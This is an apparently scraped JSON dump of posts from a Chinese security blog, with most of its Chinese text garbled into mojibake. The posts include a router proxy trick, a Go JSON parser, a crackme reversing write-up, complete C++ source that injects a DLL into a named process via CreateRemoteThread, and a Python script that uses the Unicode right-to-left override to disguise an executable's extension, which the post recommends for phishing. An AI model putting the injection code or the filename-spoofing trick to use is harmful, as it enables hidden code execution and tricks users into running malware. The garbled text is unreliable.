æˆ‘æƒ³è¦è¯´çš„æ˜¯è¿æ¥eä¿¡åä½¿ç”¨è·¯ç”±å™¨ä¸Šç½‘ï¼Œå¹¶ä¸”æ˜¯ç»å¯¹æ­£å¸¸çš„æ€ç»´\næ‰‹æœºä¹Ÿæ˜¯å¯ä»¥è¿æ¥ä¸Šwifiï¼Œä½†æ˜¯æ‰‹æœºä¸Šè¿æ¥wifiåçš„ipåœ°å€ä¸æ˜¯æˆ‘ä»¬çš„è·¯ç”±å™¨åˆ†é…å’Œè·¯ç”±å™¨ç½‘å…³ï¼Œæˆ‘ä»¬æ”¹æ‰ï¼Œä½¿æ‰‹æœºä¸ç”µè„‘å¤„äºåŒä¸€ç½‘å…³ ç„¶åç”µè„‘å¼€ssserverï¼ˆè¿™ç©æ„æ˜¯ä»€ä¹ˆä¸ç”¨æˆ‘å¤šè¯´ï¼Œå…¶å®ä½ ä¹Ÿå¯ä»¥ç”µè„‘æ­å»ºhttp proxy serverï¼ˆæ¯”å¦‚ä½¿ç”¨cowï¼‰ï¼Œç„¶åæ‰‹æœºè¿æ¥wifiè®¾ç½®ç›´æ¥é€šè¿‡ä»£ç†ï¼Œä½†æ˜¯å¯¹äºçº¯tcpå’Œudpå°±æ— èƒ½ä¸ºåŠ›äº†ï¼‰ æ‰‹æœºè¿æ¥ç”µè„‘ssserverï¼Œå¯ä»¥ä¸Šç½‘äº†ï¼Œé€šè¿‡å¼€debugæ¨¡å¼å¯ä»¥å‘ç°èµ°çš„æ˜¯ç”µè„‘ssserverä¸Šç½‘ å…·ä½“çš„å°ç™½è¯¦ç»†æ•™ç¨‹åšæ³•çœ‹å¿ƒæƒ…å’Œæ—¶é—´å§\n","permalink":"https://www.hacktech.cn/post/exin-ssserver.html","summary":"\u003cp\u003eå…³äºeä¿¡â€œæ­£å¸¸æƒ…å†µä¸‹â€ä½¿ç”¨è·¯ç”±å™¨ç½‘ä¸Šæ˜¯æœ‰æ–¹æ³•çš„ï¼Œå…¥æˆ·çº¿æ’ä¸Šlanï¼Œç”µè„‘æ¥lanæ‹¨å·\næˆ‘æƒ³è¦è¯´çš„æ˜¯è¿æ¥eä¿¡åä½¿ç”¨è·¯ç”±å™¨ä¸Šç½‘ï¼Œå¹¶ä¸”æ˜¯ç»å¯¹æ­£å¸¸çš„æ€ç»´\u003c/p\u003e","title":"eä¿¡ä¸é…¸é…¸ç»“åˆå¼€wifiä½¿ç”¨è·¯ç”±å™¨ä¸Šç½‘"},{"content":"çªç„¶æƒ³èµ·æ¥è‡ªå·±ä»¥å‰å†™çš„ï¼Œgolangå†™çš„ä¸€ä¸ªç®€æ˜“çš„jsonè§£æå™¨ï¼Œåˆ†äº«ä¸€ä¸‹\nå®‰è£… 1 go get github.com/akkuman/parseConfig ä½¿ç”¨è¯´æ˜ ç¯å¢ƒå‡è®¾ 1 2 3 . â”œâ”€â”€ config.go â”œâ”€â”€ config.json config.jsonå†…å®¹\n1 2 3 4 5 6 7 8 { \u0026#34;name\u0026#34; : \u0026#34;akkuman\u0026#34;, \u0026#34;urls\u0026#34; : [\u0026#34;xx.com\u0026#34;,\u0026#34;ww.com\u0026#34;], \u0026#34;info\u0026#34; : { \u0026#34;qq\u0026#34; : \u0026#34;123456\u0026#34;, \u0026#34;weixin\u0026#34;: \u0026#34;123456\u0026#34; } } è¯¥åº“å–å‡ºæ¥çš„éƒ½æ˜¯ç±»å‹ä¸ºinterface{}çš„æ•°æ®ï¼Œå¦‚éœ€å–å‡ºå…·ä½“ç±»å‹çš„æ•°æ®éœ€è¦è‡ªå·±åŠ æ–­è¨€\nå½“å–åµŒå¥—mapæ•°æ®çš„æ—¶å€™ï¼Œä»¥â€œ \u0026gt; â€æŒ‡å®šä¸‹ä¸€çº§ï¼Œæ³¨æ„\u0026gt;ä¸¤è¾¹å‡æœ‰ç©ºæ ¼ï¼Œå…·ä½“è§ä¸‹é¢çš„ä¾‹å­\nä¾‹å­ config.goå†…å®¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package main import ( \u0026#34;github.com/akkuman/parseConfig\u0026#34; ) func main() { var config = parseConfig.New(\u0026#34;config.json\u0026#34;) // æ­¤ä¸ºinterface{}æ ¼å¼æ•°æ® var name = config.Get(\u0026#34;name\u0026#34;) // æ–­è¨€ var nameString = name.(string) // å–æ•°ç»„ var urls = config.Get(\u0026#34;urls\u0026#34;).([]interface{}) var urlsString []string for _,v := range urls { urlsString = append(urlsString, v.(string)) } // å–åµŒå¥—mapå†…æ•°æ® var qq = config.Get(\u0026#34;info \u0026gt; qq\u0026#34;).(\u0026#34;string\u0026#34;) var weixin = config.Get(\u0026#34;info \u0026gt; weixin\u0026#34;).(\u0026#34;string\u0026#34;) } ","permalink":"https://www.hacktech.cn/post/golang%E8%A7%A3%E6%9E%90json%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.html","summary":"\u003cp\u003eçªç„¶æƒ³èµ·æ¥è‡ªå·±ä»¥å‰å†™çš„ï¼Œgolangå†™çš„ä¸€ä¸ªç®€æ˜“çš„jsonè§£æå™¨ï¼Œåˆ†äº«ä¸€ä¸‹\u003c/p\u003e\n\u003ch2 id=\"å®‰è£…\"\u003eå®‰è£…\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-golang\" data-lang=\"golang\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egithub\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecom\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eakkuman\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eparseConfig\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003ch2 id=\"ä½¿ç”¨è¯´æ˜\"\u003eä½¿ç”¨è¯´æ˜\u003c/h2\u003e","title":"golangè§£æjsoné…ç½®æ–‡ä»¶"},{"content":"talk is cheap,show me code ä»£ç æœ‰è¯¦ç»†æ³¨é‡Šï¼Œæ–‡ç« åº•éƒ¨æç¤ºäº†ä¸€äº›å‘\nä¸»ç¨‹åº 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 #include \u0026#34;stdafx.h\u0026#34; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;tlhelp32.h\u0026gt; #include \u0026lt;tchar.h\u0026gt; using namespace std; int EnableDebugPriv(char* name) { HANDLE hToken; TOKEN_PRIVILEGES tp; LUID luid; //æ‰“å¼€è¿›ç¨‹ä»¤ç‰Œç¯ OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \u0026amp;hToken); //è·å¾—è¿›ç¨‹æœ¬åœ°å”¯ä¸€ID LookupPrivilegeValue(NULL, name, \u0026amp;luid); tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; tp.Privileges[0].Luid = luid; //è°ƒæ•´æƒé™ AdjustTokenPrivileges(hToken, 0, \u0026amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL); return 0; } //***************************************************************************************************************************** BOOL InjectDll(LPCSTR DllFullPath, const DWORD dwRemoteProcessId) { // æå‡æƒé™(å¿…é¡»ç®¡ç†å‘˜èº«ä»½) EnableDebugPriv(SE_DEBUG_NAME); //æ‰“å¼€è¿œç¨‹çº¿ç¨‹ HANDLE hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId); if (hRemoteProcess == NULL) { cout \u0026lt;\u0026lt; \u0026#34;Error: OpenProcess failed!\\n\u0026#34; \u0026lt;\u0026lt; endl; return FALSE; } //ä½¿ç”¨VirtualAllocExå‡½æ•°åœ¨è¿œç¨‹è¿›ç¨‹çš„å†…å­˜åœ°å€ç©ºé—´åˆ†é…DLLæ–‡ä»¶åç©ºé—´ LPVOID pszLibFileRemote = VirtualAllocEx(hRemoteProcess, NULL, lstrlen(DllFullPath) + 1, MEM_COMMIT, PAGE_READWRITE); if (pszLibFileRemote == NULL) { CloseHandle(hRemoteProcess); cout \u0026lt;\u0026lt; \u0026#34;Error: VirtualAllocEx failed!\\n\u0026#34; \u0026lt;\u0026lt; endl; return FALSE; } //ä½¿ç”¨WriteProcessMemoryå‡½æ•°å°†DLLçš„è·¯å¾„åå†™å…¥åˆ°è¿œç¨‹è¿›ç¨‹çš„å†…å­˜ç©ºé—´ if (!WriteProcessMemory(hRemoteProcess, pszLibFileRemote, DllFullPath, lstrlen(DllFullPath) + 1, NULL)) { CloseHandle(hRemoteProcess); cout \u0026lt;\u0026lt; \u0026#34;Error: WriteProcessMemory failed!\\n\u0026#34; \u0026lt;\u0026lt; endl; return FALSE; } //å¯åŠ¨è¿œç¨‹çº¿ç¨‹LoadLibraryAï¼Œé€šè¿‡è¿œç¨‹çº¿ç¨‹è°ƒç”¨åˆ›å»ºæ–°çš„çº¿ç¨‹ HANDLE hRemoteThread; if ((hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pszLibFileRemote, 0, NULL)) == NULL) { CloseHandle(hRemoteProcess); cout \u0026lt;\u0026lt; \u0026#34;Error: the remote thread could not be created.\\n\u0026#34; \u0026lt;\u0026lt; endl; return FALSE; } else { // ç­‰å¾…çº¿ç¨‹é€€å‡º è¦è®¾ç½®è¶…æ—¶ ä»¥å…è¿œç¨‹çº¿ç¨‹æŒ‚èµ·å¯¼è‡´ç¨‹åºæ— å“åº” //WaitForSingleObject(hRemoteThread, 10000); // å¦‚æœç­‰å¾…çº¿ç¨‹ DLLä¸­çš„DllMainä¸è¦å†™MessageBox cout \u0026lt;\u0026lt; \u0026#34;Success: the remote thread was successfully created.\\n\u0026#34; \u0026lt;\u0026lt; endl; } // é‡Šæ”¾å¥æŸ„ CloseHandle(hRemoteProcess); CloseHandle(hRemoteThread); return TRUE; } // æ ¹æ®è¿›ç¨‹åç§°è·å–è¿›ç¨‹ID DWORD FindTarget(LPCSTR lpszProcess) { DWORD dwRet = 0; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe32; pe32.dwSize = sizeof(PROCESSENTRY32 ); Process32First(hSnapshot, \u0026amp;pe32 ); do { if (lstrcmpi(pe32.szExeFile, lpszProcess) == 0) { dwRet = pe32.th32ProcessID; break; } } while (Process32Next(hSnapshot, \u0026amp;pe32)); CloseHandle(hSnapshot); return dwRet; } //***************************************************************************************************************************** int main() { DWORD id = FindTarget((LPCSTR)\u0026#34;calc.exe\u0026#34;); cout \u0026lt;\u0026lt; id \u0026lt;\u0026lt; endl; // è·å–å¯æ‰§è¡Œæ–‡ä»¶æ‰€åœ¨ç›®å½• TCHAR szFilePath[MAX_PATH + 1]; GetModuleFileName(NULL, szFilePath, MAX_PATH); *(_tcsrchr(szFilePath, \u0026#39;\\\\\u0026#39;)) = 0; _tcscat_s(szFilePath, sizeof(szFilePath), \u0026#34;\\\\dll.dll\u0026#34;); cout \u0026lt;\u0026lt; szFilePath \u0026lt;\u0026lt; endl; InjectDll(szFilePath, id);//è¿™ä¸ªæ•°å­—æ˜¯ä½ æƒ³æ³¨å…¥çš„è¿›ç¨‹çš„IDå· return 0; } dllmain 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚ #include \u0026#34;stdafx.h\u0026#34; #include \u0026lt;iostream\u0026gt; using namespace std; BOOL APIENTRY DllMain(HINSTANCE hInst /* Library instance handle. */, DWORD reason /* Reason this function is being called. */, LPVOID reserved /* Not used. */) { switch (reason) { case DLL_PROCESS_ATTACH: //å½“è¿™ä¸ªDLLè¢«æ˜ å°„åˆ°äº†è¿›ç¨‹çš„åœ°å€ç©ºé—´æ—¶ MessageBox(0, TEXT(\u0026#34;From DLL\\n\u0026#34;), TEXT(\u0026#34;Process Attach\u0026#34;), MB_ICONINFORMATION); cout \u0026lt;\u0026lt; \u0026#34;Process Attach\u0026#34; \u0026lt;\u0026lt; endl; break; case DLL_PROCESS_DETACH: //è¿™ä¸ªDLLä»è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­è§£é™¤æ˜ å°„ MessageBox(0, TEXT(\u0026#34;From DLL\\n\u0026#34;), TEXT(\u0026#34;Process Detach\u0026#34;), MB_ICONINFORMATION); cout \u0026lt;\u0026lt; \u0026#34;Process Detach\u0026#34; \u0026lt;\u0026lt; endl; break; case DLL_THREAD_ATTACH: //ä¸€ä¸ªçº¿ç¨‹æ­£åœ¨è¢«åˆ›å»º MessageBox(0, TEXT(\u0026#34;From DLL\\n\u0026#34;), TEXT(\u0026#34;Thread Attach\u0026#34;), MB_ICONINFORMATION); cout \u0026lt;\u0026lt; \u0026#34;Thread Attach\u0026#34; \u0026lt;\u0026lt; endl; break; case DLL_THREAD_DETACH: //çº¿ç¨‹ç»ˆç»“ MessageBox(0, TEXT(\u0026#34;From DLL\\n\u0026#34;), TEXT(\u0026#34;Thread Detach\u0026#34;), MB_ICONINFORMATION); cout \u0026lt;\u0026lt; \u0026#34;Thread Detach\u0026#34; \u0026lt;\u0026lt; endl; break; } return TRUE; } éœ€è¦æ³¨æ„çš„åœ°æ–¹ ç¯å¢ƒæ˜¯vsï¼Œå­—ç¬¦é›†æ˜¯å¤šå­—èŠ‚ è¿™ä»½ä»£ç ä¸­çš„hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pszLibFileRemote, 0, NULL)ä¸­çš„ä¹Ÿå¯é‡‡ç”¨GetProcAddresså‡½æ•° è¿™ä»½ä»£ç å¹¶ä¸æ˜¯é€šç”¨æ³¨å…¥ä»£ç ï¼ˆå¦‚æœéœ€è¦é€šç”¨éœ€è¦è‡ªè¡Œè§£æpeå¤´ç»“æ„ä»ä¸­å–å‡ºkernel32.dllçš„GetProcAddressåœ°å€ï¼‰,æ‰€ä»¥64ä½windowsä¸Šéœ€è¦æŠŠvsè®¾ç½®ä¸ºç¼–è¯‘x64 ","permalink":"https://www.hacktech.cn/post/dll%E6%B3%A8%E5%85%A5%E5%88%B0%E6%8C%87%E5%AE%9A%E8%BF%9B%E7%A8%8B.html","summary":"\u003cp\u003etalk is cheap,show me code\nä»£ç æœ‰è¯¦ç»†æ³¨é‡Šï¼Œæ–‡ç« åº•éƒ¨æç¤ºäº†ä¸€äº›å‘\u003c/p\u003e","title":"dllæ³¨å…¥åˆ°æŒ‡å®šè¿›ç¨‹"},{"content":"è¿™ä¸ªæŠ€æœ¯è™½ç„¶è€æ‰ç‰™ï¼Œä½†åœ¨ç½‘ç»œé’“é±¼ä¸­éå¸¸å¥½ç”¨\nç›®å½•ç»“æ„ 1 2 1.py rc_srceen.exe pyæ–‡ä»¶å†…å®¹ 1 2 3 import os name = \u0026#34;\\u202Excod.exe\u0026#34; os.rename(os.path.join(os.getcwd(),\u0026#39;re_screen.exe\u0026#39;),os.path.join(os.getcwd(),\u0026#34;re_screen\u0026#34;+name)) æ‰§è¡Œå åŸç† UnicodeåŒ…å«è‹¥å¹²ä¸ªç‰¹æ®Šå­—ç¬¦ä¸²ï¼Œå…è®¸åœ¨æ­£å¸¸æƒ…å†µä¸‹ä»å·¦åˆ°å³çš„æ–‡æœ¬ä¸­æ’å…¥ä»å³åˆ°å·¦çš„æ–‡å­—.å…¶ä¸­ä¸€ä¸ªå³åˆ°å·¦è¦†å†™å­—ç¬¦ä¸²å°±æ˜¯â€œU+202Eâ€ è¯¦è§åƒä¸‡å°å¿ƒä»å³å‘å·¦è¦†ç›–æŠ€æœ¯ æ¶æ„è½¯ä»¶ç»å¸¸ç”¨è¿™ä¸ªæ–¹æ³•éª—ç”¨æˆ·\n","permalink":"https://www.hacktech.cn/post/%E4%BB%8E%E5%8F%B3%E5%90%91%E5%B7%A6%E8%A6%86%E7%9B%96%E5%AE%9E%E7%8E%B0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E6%AC%BA%E9%AA%97.html","summary":"\u003cp\u003eè¿™ä¸ªæŠ€æœ¯è™½ç„¶è€æ‰ç‰™ï¼Œä½†åœ¨ç½‘ç»œé’“é±¼ä¸­éå¸¸å¥½ç”¨\u003c/p\u003e","title":"ä»å³å‘å·¦è¦†ç›–å®ç°æ¶æ„è½¯ä»¶æ‰©å±•åæ¬ºéª—"},{"content":"åŸºäºLeanCloudçš„æ–‡ç« é˜…è¯»æ¬¡æ•°ç»Ÿè®¡æ’ä»¶ https://github.com/Weic96/LeanStatistics.js\nåŸºäºLeanCloudçš„æ–‡ç« è¯„è®º https://github.com/xCss/Valine\n","permalink":"https://www.hacktech.cn/post/%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E9%98%85%E8%AF%BB%E6%AC%A1%E6%95%B0%E4%B8%8E%E8%AF%84%E8%AE%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html","summary":"\u003cp\u003eåŸºäºLeanCloudçš„æ–‡ç« é˜…è¯»æ¬¡æ•°ç»Ÿè®¡æ’ä»¶\n\u003ca href=\"https://github.com/Weic96/LeanStatistics.js\"\u003ehttps://github.com/Weic96/LeanStatistics.js\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eåŸºäºLeanCloudçš„æ–‡ç« è¯„è®º\n\u003ca href=\"https://github.com/xCss/Valine\"\u003ehttps://github.com/xCss/Valine\u003c/a\u003e\u003c/p\u003e","title":"é™æ€åšå®¢é˜…è¯»æ¬¡æ•°ä¸è¯„è®ºè§£å†³æ–¹æ¡ˆ"},{"content":"åªè¯´ä¸€ä¸ªï¼Œæ˜¯å…«è¿›åˆ¶,ä¸‹é¢æ˜¯è§£ç è„šæœ¬ ç¯å¢ƒpython3\n```python # -*-coding:utf-8-*- # Author: Akkuman # Blog: www.hacktech.cn Tust4Youçš„é—®é¢˜æ˜¯å…«è¿›åˆ¶,æ‰€ä»¥å…«è¿›åˆ¶è½¬asciiå³å¯ è§£ç é—®é¢˜ print(\u0026ldquo;Please input the code what you see on register\u0026rsquo;s page of Tust 4 You:\u0026rdquo;) encode_code = input() encode_list = encode_code.split() print(\u0026quot;\\nthe question is\\n\u0026quot;) for i in encode_list: i = int(i,8) print(chr(i), end=\u0026quot;\u0026quot;)\n","permalink":"https://www.hacktech.cn/post/tuts4you-register.html","summary":"\u003cp\u003eåªè¯´ä¸€ä¸ªï¼Œæ˜¯å…«è¿›åˆ¶,ä¸‹é¢æ˜¯è§£ç è„šæœ¬\nç¯å¢ƒpython3\u003c/p\u003e","title":"Tuts4youæ³¨å†Œé—®é¢˜è§£ç "},{"content":"è¯´å®è¯ï¼Œä»Šå¤©è¢«è‡ªå·±è ¢å“­äº†\nå› ä¸ºçœ‹å¤šäº†ä¸€ä¸ªå­—ç¬¦ï¼Œä»¥ä¸ºæ˜¯è¾“å…¥å­—ç¬¦å˜å½¢åçš„base64ç¼–ç ï¼Œä¹Ÿæ€ªè‡ªå·±æ²¡å¤§è‡´çœ‹è¿‡base64æ±‡ç¼–å½¢å¼ï¼ŒæŠŠbase64è·Ÿå®Œäº†ç”¨pyå®ç°å®Œç®—æ³•æ‰æ„æ€åˆ°æ˜¯base64ï¼Œè¿™æ˜¯é¢˜å¤–è¯\næœ¬äººåˆå­¦è€…ï¼Œä¸¤å¤©æˆ–ä¸€å¤©ä¸€ä¸ªcmç»ƒç»ƒï¼Œå¤§å®¶å¯ä»¥ä¸æˆ‘äº¤æµakkumans@qq.comï¼Œæˆ‘åšå®¢\nä¸Šé¢çš„é¢˜å¤–è¯å°±æ˜¯ä»Šå¤©æçš„ä¸€ä¸ªcmï¼Œè¢«è‡ªå·±è ¢å“­äº†ï¼Œä¸è¿‡ä¹Ÿç®—æ˜¯base64ç¼–ç æµç¨‹æ— æ¯”æ¸…æ™°äº†ï¼Œä¸ç®—æ˜¯æ— ç”¨åŠŸ\nè¿™ä¸ªcmæ˜¯ä¸€ä¸ªæ§åˆ¶å°çš„ï¼Œä¸¢åˆ°xpæ— æ³•è¿è¡Œï¼Œæœ¬æœºåªè£…äº†x64dbg(x32dbg)ï¼Œç”¨è¿™ä¸ªè°ƒè¯•è½¯ä»¶æ¥è¯•è¯•å§\n1 2 3 C:\\Users\\Administrator\\Desktop\u0026gt;reverse3.exe Please enter the flag:97103012 wrong input å­—ç¬¦ä¸²æœç´¢ï¼Œæ‰¾åˆ°åˆ¤æ–­çš„åœ°æ–¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 01241269 | 85 C0 | test eax,eax | zf=1 =\u0026gt; eax=0 0124126B | 75 07 | jne reverse3.1241274 | 0124126D | 68 78 21 24 01 | push reverse3.1242178 | 1242178:\u0026#34;this is the right flag\u0026#34; 01241272 | EB 05 | jmp reverse3.1241279 | 01241274 | 68 90 21 24 01 | push reverse3.1242190 | 1242190:\u0026#34;wrong input\u0026#34; 01241279 | FF 15 B0 20 24 01 | call dword ptr ds:[\u0026lt;\u0026amp;puts\u0026gt;] | 0124127F | 8B 4D FC | mov ecx,dword ptr ss:[ebp-4] | 01241282 | 83 C4 04 | add esp,4 | 01241285 | 33 CD | xor ecx,ebp | 01241287 | 33 C0 | xor eax,eax | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 01241289 | E8 92 00 00 00 | call reverse3.1241320 | 0124128E | 8B E5 | mov esp,ebp | 01241290 | 5D | pop ebp | 01241291 | C3 | ret | å¯ä»¥çœ‹åˆ°è¦å¾—åˆ°flagï¼Œjneå°±ä¸èƒ½è·³ï¼Œä¹Ÿå°±æ˜¯test eax,eaxåçš„ZF=1ï¼Œä¹Ÿå°±æ˜¯eax=0\né‚£è¿™ä¸ªeax=0ä»ä½•è€Œæ¥ï¼Ÿæˆ‘ä»¬æ¥ç€å¾€ä¸Šçœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 012411A0 | 55 | push ebp | 012411A1 | 8B EC | mov ebp,esp | 012411A3 | 83 EC 44 | sub esp,44 | 012411A6 | A1 04 30 24 01 | mov eax,dword ptr ds:[1243004] | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 012411AB | 33 C5 | xor eax,ebp | 012411AD | 89 45 FC | mov dword ptr ss:[ebp-4],eax | 012411B0 | 0F 57 C0 | xorps xmm0,xmm0 | 012411B3 | C7 45 F8 00 00 00 00 | mov dword ptr ss:[ebp-8],0 | 012411BA | 68 58 21 24 01 | push reverse3.1242158 | 1242158:\u0026#34;Please enter the flag:\u0026#34; 012411BF | 0F 11 45 E8 | movups xmmword ptr ss:[ebp-18],xmm0 | 012411C3 | 0F 11 45 C0 | movups xmmword ptr ss:[ebp-40],xmm0 | 012411C7 | 0F 11 45 D0 | movups xmmword ptr ss:[ebp-30],xmm0 | 012411CB | 66 0F D6 45 E0 | movq qword ptr ss:[ebp-20],xmm0 | 012411D0 | E8 1B 01 00 00 | call reverse3.12412F0 | 012411D5 | 8D 45 E8 | lea eax,dword ptr ss:[ebp-18] | 012411D8 | 50 | push eax | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 012411D9 | 68 70 21 24 01 | push reverse3.1242170 | 1242170:\u0026#34;%20s\u0026#34; 012411DE | E8 CD 00 00 00 | call reverse3.12412B0 | 012411E3 | 8D 4D E8 | lea ecx,dword ptr ss:[ebp-18] | ä½ çš„è¾“å…¥ -\u0026gt; ecx 012411E6 | 83 C4 0C | add esp,C | 012411E9 | 8D 51 01 | lea edx,dword ptr ds:[ecx+1] | ä½ çš„è¾“å…¥å‡ç¬¬ä¸€ä¸ªå­—èŠ‚ -\u0026gt; edx 012411EC | 0F 1F 40 00 | nop dword ptr ds:[eax] | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 012411F0 | 8A 01 | mov al,byte ptr ds:[ecx] | 012411F2 | 41 | inc ecx | 012411F3 | 84 C0 | test al,al | 012411F5 | 75 F9 | jne reverse3.12411F0 | 012411F7 | 2B CA | sub ecx,edx | ä½ çš„è¾“å…¥çš„é•¿åº¦ -\u0026gt; ecx 012411F9 | 8D 55 E8 | lea edx,dword ptr ss:[ebp-18] | è¾“å…¥ -\u0026gt; edx 012411FC | 56 | push esi | esi:\u0026#34;TacMDMzMTI=\u0026#34; 012411FD | 51 | push ecx | 012411FE | 51 | push ecx | 012411FF | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] | 01241202 | E8 F9 FD FF FF | call reverse3.1241000 | base64(ä½ çš„è¾“å…¥) -\u0026gt; [ebp - 0x40] 01241207 | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] | 0124120A | 83 C4 08 | add esp,8 | 0124120D | 33 D2 | xor edx,edx | 0124120F | 8D 71 01 | lea esi,dword ptr ds:[ecx+1] | esi:\u0026#34;TacMDMzMTI=\u0026#34; 01241212 | 8A 01 | mov al,byte ptr ds:[ecx] | 01241214 | 41 | inc ecx | 01241215 | 84 C0 | test al,al | 01241217 | 75 F9 | jne reverse3.1241212 | 01241219 | 2B CE | sub ecx,esi | é•¿åº¦ï¼ˆbase64ä½ çš„è¾“å…¥ï¼‰ -\u0026gt; ecx 0124121B | 74 37 | je reverse3.1241254 | 0124121D | 0F 1F 00 | nop dword ptr ds:[eax] | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 01241220 | 8A 4C 15 C0 | mov cl,byte ptr ss:[ebp+edx-40] | 01241224 | 33 C0 | xor eax,eax | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 01241226 | 3A 88 08 21 24 01 | cmp cl,byte ptr ds:[eax+1242108] | 0124122C | 74 08 | je reverse3.1241236 | 0124122E | 40 | inc eax | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 0124122F | 83 F8 1A | cmp eax,1A | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 01241232 | 72 F2 | jb reverse3.1241226 | 01241234 | EB 0A | jmp reverse3.1241240 | 01241236 | 8A 80 24 21 24 01 | mov al,byte ptr ds:[eax+1242124] | 0124123C | 88 44 15 C0 | mov byte ptr ss:[ebp+edx-40],al | 01241240 | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] | 01241243 | 42 | inc edx | 01241244 | 8D 71 01 | lea esi,dword ptr ds:[ecx+1] | esi:\u0026#34;TacMDMzMTI=\u0026#34; 01241247 | 8A 01 | mov al,byte ptr ds:[ecx] | 01241249 | 41 | inc ecx | 0124124A | 84 C0 | test al,al | 0124124C | 75 F9 | jne reverse3.1241247 | 0124124E | 2B CE | sub ecx,esi | esi:\u0026#34;TacMDMzMTI=\u0026#34; 01241250 | 3B D1 | cmp edx,ecx | 01241252 | 72 CC | jb reverse3.1241220 | 01241254 | 6A 14 | push 14 | 01241256 | 8D 45 C0 | lea eax,dword ptr ss:[ebp-40] | 01241259 | 68 40 21 24 01 | push reverse3.1242140 | 1242140:\u0026#34;o2Ffx3V0OjJtYW5spQ==\u0026#34; 0124125E | 50 | push eax | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 0124125F | FF 15 C4 20 24 01 | call dword ptr ds:[\u0026lt;\u0026amp;strncmp\u0026gt;] | ç»è¿‡å¤„ç†çš„base64ä¸å†…ç½®base64å€¼æ¯”è¾ƒï¼Œç›¸ç­‰=\u0026gt;eax=0 01241265 | 83 C4 0C | add esp,C | 01241268 | 5E | pop esi | esi:\u0026#34;TacMDMzMTI=\u0026#34; 01241269 | 85 C0 | test eax,eax | zf=1 =\u0026gt; eax=0 0124126B | 75 07 | 